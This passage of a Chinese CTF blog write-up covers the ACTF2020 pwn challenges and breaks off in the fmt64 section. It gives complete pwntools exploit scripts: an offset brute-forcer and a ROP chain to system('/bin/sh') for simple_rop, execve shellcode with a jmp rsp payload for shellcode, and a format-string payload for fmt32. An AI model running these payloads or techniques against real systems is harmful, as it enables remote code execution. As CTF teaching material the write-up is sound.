toc-level-2"><a class="toc-link" href="#白给"><span class="toc-text">白给</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Music-for-free"><span class="toc-text">Music for free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWP"><span class="toc-text">SWP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#喵咪"><span class="toc-text">喵咪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Login"><span class="toc-text">Login</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#end"><span class="toc-text">end</span></a></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/ea6503c45cfe7010dd038787933e588c.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">ACTF2020 writeup</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2020-02-13<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2020-03-26</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span><div class="post-meta-wordcount"><i class="fa fa-file-word-o post-meta__icon fa-fw" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">14.1k</span><span class="post-meta__separator">|</span><i class="fa fa-clock-o post-meta__icon fa-fw" aria-hidden="true"></i><span>阅读时长: 67 分钟</span><div class="post-meta-pv-cv"><span class="post-meta__separator">|</span><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h1 id="ACTF-2020"><a href="#ACTF-2020" class="headerlink" title="ACTF 2020"></a>ACTF 2020</h1><p>中南大学和河北师范大学联合举办的寒假新人赛~</p>
<p>比赛时间：2月1日10:00 - 2月14日20:00</p>
<p>本想着冒充萌新蹭一场新生赛，让我这个19级刚入学的真萌新涨涨姿势，但没想到第一天就被发现了QAQ</p>
<p>这次比赛总体来说比较适合入门，web题目貌似很简单，听<a href="https://imagin.vip/" target="_blank" rel="noopener">imagin</a>师傅说他刚开题就AK了…tql…作为一名二进制萌新，我主要做了re和pwn的题。pwn题比较基础，但还是学了不少新姿势，re就很烧脑了，不知掉了多少头发才做出来…不过很有意思鸭~</p>
<hr>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>pwn两道堆的题目还是不会做，chk_rop想了很久也没pwn出来，最后剩了3道题，等官方wp出来好好学习一波…</p>
<h2 id="simple-rop"><a href="#simple-rop" class="headerlink" title="simple_rop"></a>simple_rop</h2><ul>
<li>题目描述：Not your abs!</li>
<li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/simple_rop/simple_rop" target="_blank" rel="noopener">simple_rop</a></li>
<li>考察点：ROP攻击、abs函数漏洞、无符号整数</li>
<li>难度：简单</li>
<li>分值：100</li>
<li>完成人数：4</li>
</ul>
<p>首先分析程序，主要函数如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_8048738</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> ptr)</span></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">abs</span>(ptr);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )&#123;</span><br><span class="line">    v6 %= <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    v6 = rand() % <span class="number">16</span>;</span><br><span class="line">    buf[<span class="number">16</span> - v6] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">size</span> = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v4[v6], buf, <span class="built_in">size</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"copy over!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中<code>buf</code>中是之前<code>read</code>读的48字节数据，<code>ptr</code>是<code>scanf(&quot;%ud&quot;)</code>读的无符号整数，这里想要栈溢出，必须让<code>abs(ptr)&lt;0</code>，否则<code>buf</code>会被随机截断…然鹅，取绝对值后的数肿么可能是负数呢！？？？百度了一下，原来<code>abs</code>函数存在漏洞：</p>
<blockquote>
<p><code>abs</code>函数的返回值是有符号整数<code>int</code>，表示范围是<code>-2147483648~2147483647</code></p>
<p>当<code>ptr=-2147483648</code>时，对应的绝对值是<code>2147483648</code>，超过了<code>int</code>的最大表示范围，产生溢出</p>
<p>溢出的结果是<code>-2147483648</code>，所以此时<code>abs</code>函数的返回值是个负数</p>
</blockquote>
<p>此外，这题给的<code>ptr</code>是无符号整数，因此直接让<code>ptr=2147483648</code>，也可以实现有符号整数溢出</p>
<p>绕过了<code>abs</code>之后还有一个坑，<code>memcpy</code>的目的地址会加上<code>v6</code>，然鹅<code>v6</code>的值并不确定…我在本地攻击时<code>v6=2</code>，而远程攻击却失败了，原因就是本地和远程环境<code>v6</code>的值不一样…</p>
<p>解决办法是写个脚本，爆破一下<code>offset</code>（<code>v6</code>取值范围为<code>0~32</code>，对应<code>offset</code>取值范围<code>4~36</code>）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] copy over!</span><br><span class="line">    You need search Rop</span><br><span class="line">[+] right! offset&#x3D;36</span><br><span class="line">[*] Closed connection to 47.106.94.13 port 50012</span><br></pre></td></tr></table></figure></div>

<p>爆破脚本如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./simple_rop'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line">system = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = <span class="number">0x804a050</span></span><br><span class="line">main = <span class="number">0x804864B</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p,offset)</span>:</span>        </span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="comment"># offset = 34</span></span><br><span class="line">    payload = <span class="string">'A'</span>*offset</span><br><span class="line">    <span class="comment"># payload += p32(system) + p32(main) + p32(binsh)</span></span><br><span class="line">    payload += p32(main)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">'Rop\n'</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">'cursor: \n'</span>)</span><br><span class="line">    <span class="comment"># debug('b *0x8048785')</span></span><br><span class="line">    sl(<span class="string">'-2147483648'</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    data = rc(<span class="number">1000</span>)</span><br><span class="line">    log.success(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You need search Rop'</span> <span class="keyword">in</span> data:</span><br><span class="line">        log.success(<span class="string">"right! offset="</span>+str(offset))</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log.warning(<span class="string">"fail!  offset="</span>+str(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#  v6  off</span></span><br><span class="line"><span class="comment">#  0   36</span></span><br><span class="line"><span class="comment">#  2   34</span></span><br><span class="line"><span class="comment">#  32  4</span></span><br><span class="line">offset = <span class="number">36</span></span><br><span class="line"><span class="keyword">while</span> flag==<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        is_local = <span class="literal">True</span></span><br><span class="line">        p = process(local_file)</span><br><span class="line">        libc = ELF(local_libc)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        is_remote = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">            host = sys.argv[<span class="number">1</span>]</span><br><span class="line">            port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">        p = remote(host, port)</span><br><span class="line">        libc = ELF(remote_libc)</span><br><span class="line">    exp(p,offset)</span><br><span class="line">    offset -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> offset &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p>拿到远程的<code>offset</code>之后才是真正的<code>SIMPLE ROP</code>攻击…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./simple_rop'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">system = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">36</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'-2147483648'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>p.s.其实<code>docker</code>默认的操作系统是<code>Ubuntu16.04</code>，但是不可能为了做个题就装个虚拟机吧hhhh</p>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><ul>
<li>题目描述：Do you know stack ?</li>
<li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/shellcode/shellcode" target="_blank" rel="noopener">shellcode</a></li>
<li>考察点：shellcode</li>
<li>难度：入门</li>
<li>分值：100</li>
<li>完成人数：3</li>
</ul>
<p>首先查看一下程序保护：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>

<p>栈可执行，并且给了<code>jmp rsp</code>，因此直接跳到<code>shellcode</code>即可：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./shellcode'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">jrsp = <span class="number">0x040070B</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">shellcode = <span class="string">'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">payload = shellcode.rjust(<span class="number">32</span>,<span class="string">'\x90'</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(jrsp)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'U have read 0day!\n'</span>)</span><br><span class="line">debug()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="fmt32"><a href="#fmt32" class="headerlink" title="fmt32"></a>fmt32</h2><ul>
<li>题目描述：random lucky</li>
<li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/fmt32/fmt32" target="_blank" rel="noopener">fmt32</a></li>
<li>考察点：格式化字符串漏洞</li>
<li>难度：入门</li>
<li>分值：200</li>
<li>完成人数：3</li>
</ul>
<p>格式化字符串漏洞，给了俩随机数<code>a1,a2</code>，让<code>a1==2*a2</code>就给flag，最简单的做法是<code>a1=a2=0</code>，对应的payload为<code>%6$n%7$n</code></p>
<h2 id="fmt64"><a href="#fmt64" class="headerlink" title="fmt64"></a>fmt64</h2><ul>
<li>题目描述：thanks to xxx</li>
<li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/fmt64/fmt64" target="_blank" rel="noopener">fmt64</a></li>
<li>考察点：格式化字符串漏洞、ROP、free_hook</li>
<li>难度：中等</li>
<li>分值：300</li>
<li>完成人数：2</li>
</ul>
<p>thanks to xxx? （应该不是我）这题我解出来的比较早，后来放了hint:</p>
<blockquote>
<p>hint1: stack pivot<br>hint2: hook</p>
</blockquote>
<p>嗯？hook…果然我最初的解法是非预期…</p>
<p>闲话少叙，回到正题，以下是非预期解：</p>
<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>很明显是格式化字符串漏洞，要命的是保护全开了，<code>GOT</code>表，<code>fini_array</code>等函数指针只读，没法修改…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></div>

